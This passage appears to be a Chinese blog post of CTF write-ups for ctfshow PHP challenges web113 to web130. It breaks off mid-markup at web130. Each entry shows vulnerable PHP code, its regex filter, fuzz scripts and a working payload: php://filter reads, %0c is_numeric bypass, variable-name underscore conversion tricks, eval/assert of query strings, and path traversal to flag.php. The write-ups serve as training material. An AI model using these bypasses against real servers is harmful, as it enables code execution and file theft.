plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload:?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p</span><br><span class="line">roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro</span><br><span class="line">c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/</span><br><span class="line">self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se</span><br><span class="line">lf/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><h1 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;师傅们居然tql都是非预期 哼！&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">    highlight_file(filter(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; 师傅们居然tql都是非预期 哼！</span><br></pre></td></tr></table></figure><p><code> ?file=php://filter/resource=flag.php</code></p><h1 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> trim(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> filter(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; hacker!!!</span><br></pre></td></tr></table></figure><p>知识点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">is_numeric() 检测变量是否为数字或数字字符串</span><br><span class="line"></span><br><span class="line">trim() 去除字符串首尾处的空白字符（或者其他字符）、如果不指定第二个参数，trim() 将去除这些字符：</span><br><span class="line"></span><br><span class="line">    &quot; &quot; (ASCII 32 (0x20))，普通空格符。</span><br><span class="line">    &quot;\t&quot; (ASCII 9 (0x09))，制表符。</span><br><span class="line">    &quot;\n&quot; (ASCII 10 (0x0A))，换行符。</span><br><span class="line">    &quot;\r&quot; (ASCII 13 (0x0D))，回车符。</span><br><span class="line">    &quot;\0&quot; (ASCII 0 (0x00))，空字节符。（空字符）  %0c也相当于空字符</span><br><span class="line">    &quot;\x0B&quot; (ASCII 11 (0x0B))，垂直制表符</span><br><span class="line"></span><br><span class="line">chr() 返回ascii 所对应的单个字符。</span><br><span class="line"></span><br><span class="line">此函数与 ord() 是互补的。ord() 转换字符串第一个字节为 0-255 之间的值chr() </span><br></pre></td></tr></table></figure><p>分析：</p><p>is_numeric($num)要求num识别为数字，但num不能强等于“36“</p><p>trim($num)!==’36’要求不能强等于”36“,然后filter之后要弱等于36</p><p>$num==’36’但最后要求弱等于”36”</p><p>如何绕过is_numeric()和trim()? Fuzz测试一下</p><p>测试is_numeric</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=0; $i &lt;128 ; $i++) &#123;</span><br><span class="line">$x=chr($i).&#x27;36&#x27;;</span><br><span class="line">if(is_numeric($x)===true)&#123;</span><br><span class="line">echo urlencode(chr($i)).&quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//输出%09 %0A %0B %0C %0D + %2B - . 0 1 2 3 4 5 6 7 8 9</span><br></pre></td></tr></table></figure><p>测试trim和numeric</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for($i=0;$i&lt;=128;$i++) &#123;</span><br><span class="line">$x=chr($i).&#x27;36&#x27;;</span><br><span class="line">if(trim($x)!==&#x27;36&#x27; &amp;&amp;is_numeric($x))&#123;</span><br><span class="line">echo urlencode(chr($i)).&quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//输出结果%0C %2B - . 0 1 2 3 4 5 6 7 8 9</span><br></pre></td></tr></table></figure><p>除去被过滤的+ - .  只剩下%0c ，也就是换页符\f</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?num=%0c36</span><br></pre></td></tr></table></figure><p>对于绕过，如果不知道怎么绕过就拿ASCII码把所有字符跑一遍</p><h1 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>此处的php特性：在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，such as：CTF[SHOW.COM=&gt;CTF_SHOW.COM</p><p><code>payload：CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=echo $flag</code></p><h1 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/reserved.variables.argv.php">$argv</a>：传递给脚本的参数数组</p><p><a href="https://www.cnblogs.com/luomir/p/5129875.html">详解 $_SERVER 函数中QUERY_STRING和REQUEST_URI区别(转)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&#x27;argv&#x27;]：</span><br><span class="line"></span><br><span class="line">1、cli模式（命令行）下</span><br><span class="line"></span><br><span class="line">第一个参数$_SERVER[&#x27;argv&#x27;][0]是脚本名，其余的是传递给脚本的参数</span><br><span class="line"></span><br><span class="line">2、web网页模式下</span><br><span class="line"></span><br><span class="line">在web页模式下必须在php.ini开启register_argc_argv配置项</span><br><span class="line"></span><br><span class="line">    设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果</span><br><span class="line"></span><br><span class="line">    这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]</span><br><span class="line"></span><br><span class="line">    $argv,$argc在web模式下不适用</span><br></pre></td></tr></table></figure><p>我们是在网页模式下的，注意重点：<br> <code>$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]</code><br> 而 <code>$_SERVER[‘QUERY_STRING’]</code> <strong>是获取查询语句，也就是?后面的语句</strong></p><p>举个例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?$fl0g=flag_give_me</span><br><span class="line">$a[0]=$_SERVER[&#x27;argv&#x27;][0]=$_SERVER[‘QUERY_STRING’]=&gt;$fl0g=flag_give_me</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0]) # POST</span><br><span class="line">?$fl0g=flag_give_me; #GET</span><br><span class="line">CTF_SHOW=6&amp;CTF[SHOW.COM=6&amp;fun=highlight_file($_GET[1])    #POST</span><br><span class="line">?1=flag.php#GET</span><br></pre></td></tr></table></figure><h1 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; strlen(<span class="variable">$c</span>)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>比上一题多过滤了一个；</p><p>我们可以使用assert()绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">assert() 断言：</span><br><span class="line"></span><br><span class="line">PHP 5</span><br><span class="line">bool assert ( mixed $assertion [, string $description ] )</span><br><span class="line"></span><br><span class="line">PHP 7</span><br><span class="line">bool assert ( mixed $assertion [, Throwable $exception ] )</span><br><span class="line"></span><br><span class="line">如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行</span><br><span class="line">可见，eval和assert都可以将字符当作代码执行，只不过assert不需要严格遵从语法，比如语句末尾的分号可不加</span><br><span class="line">?$fl0g=flag_give_me</span><br><span class="line">CTF_SHOW=6&amp;CTF[SHOW.COM=6&amp;fun=assert($a[0])</span><br></pre></td></tr></table></figure><h1 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$ctf_show = md5($flag);</span><br><span class="line">$url = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//特殊字符检测</span><br><span class="line">function waf($url)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;, $url))&#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(waf($url))&#123;</span><br><span class="line">    die(&quot;嗯哼？&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    extract($_GET);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($ctf_show===&#x27;ilove36d&#x27;)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/func-array-extract.html">extract(提取、抽取)函数</a>：通常情况结合数组使用</p><p>?ctf_show=ilove36d但是下划线被过滤了</p><p>自己写个fuzz脚本跑一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function waf($num)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;, $num))&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">for($i = 0; $i&lt;129; $i++)&#123;</span><br><span class="line">$num=chr($i);</span><br><span class="line">if(waf($num))&#123;</span><br><span class="line">echo &quot;未编码：&quot;.$num.&quot;   经过编码：&quot;.urlencode(chr($i)).&quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是这里我们的目的是利用空格、点、左中括号、+来被自动转换为下划线，经过fuzz得到空格，但是不知道为什么我空格经过URL编码确是+，但是%20确实符合该题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctf%20show=ilove36d</span><br></pre></td></tr></table></figure><h1 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line"><span class="variable">$f2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check(<span class="variable">$f1</span>))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func(<span class="variable">$f1</span>,<span class="variable">$f2</span>)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125; <span class="literal">NULL</span> </span><br></pre></td></tr></table></figure><p><strong><a href="https://www.cnblogs.com/lost-1987/articles/3309693.html">gettext()</a>拓展函数的用法</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_()是gettext()的拓展函数</span><br><span class="line">在开启相关设定后，_(&quot;666&quot;)等价于gettext(&quot;666&quot;)，且就返回其中的参数</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">echo gettext(666);   //输出 666</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo _(&quot;666&quot;);//输出 666</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/php-get_defined_vars-function.html">get_defined_vars()函数</a>：返回由所有已定义变量所组成的数组 ，very顾名思义</p><p>因为$flag属于是被定义变量的范畴，所以利用<code>?f1=_&amp;f2=get_defined_vars</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(call_user_func(call_user_func($f1,$f2)));</span><br><span class="line">var_dump(call_user_func(call_user_func(_,&#x27;get_defined_vars&#x27;)));</span><br><span class="line">var_dump(call_user_func(get_defined_vars));</span><br><span class="line">var_dump(get_defined_vars);</span><br></pre></td></tr></table></figure><h1 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> readfile(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><a href="https://php.p2hp.com/manual/zh/function.stripos.php">stripos()函数</a></p><p><a href="https://php.p2hp.com/manual/zh/function.readfile.php">readfile()函数</a>：<code>?f=/ctfshow/../../../../../../../var/www/html/flag.php</code>直接读就完事了</p><h1 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span 